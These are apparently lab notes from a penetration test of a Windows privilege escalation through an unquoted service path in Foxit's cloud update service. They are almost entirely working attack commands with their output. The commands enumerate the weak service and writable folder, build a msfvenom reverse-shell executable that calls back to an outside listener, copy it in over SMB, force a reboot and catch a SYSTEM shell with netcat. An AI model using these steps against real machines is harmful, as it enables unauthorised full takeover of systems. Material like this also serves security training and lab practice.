# 6 privesc\_1 FoxitCloudUpdateService

```
[*] Checking for unquoted service paths...
ServiceName   : FoxitCloudUpdateService
Path          : C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\
                FCUpdateService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'FoxitCloudUpdateService' -Pat
                h <HijackPath>
				
				
Using https://www.exploit-db.com/exploits/36390

c:\Users\daisy\Documents>sc qc FoxitCloudUpdateService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: FoxitCloudUpdateService
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Foxit Cloud Safe Update Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
		
c:\Users\daisy\Documents>accesschk.exe /accepteula -uqvc FoxitCloudUpdateService

FoxitCloudUpdateService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  R  NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  R  NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
		
# we dont have permission to stop / start service so we can restart system and cause our .exe to run

# now to check write permission on the directory
c:\Users\daisy>accesschk.exe /accepteula -uqvwd "C:\Program Files (x86)\Foxit Software"

C:\Program Files (x86)\Foxit Software
  Medium Mandatory Level (Default) [No-Write-Up]
  RW fluffy-pc\daisy
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW NT SERVICE\TrustedInstaller
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS

# we can add-file
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.200 LPORT=9001 -f exe -o Foxit.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: Foxit.exe

# move shell
C:\Program Files (x86)\Foxit Software>copy \\192.168.49.200\drive\Foxit.exe
copy \\192.168.49.200\drive\Foxit.exe
        1 file(s) copied.


# reboot system in 10 seconds
C:\Program Files (x86)\Foxit Software>shutdown /r -t 10

$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.49.200] from (UNKNOWN) [192.168.200.44] 49155
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
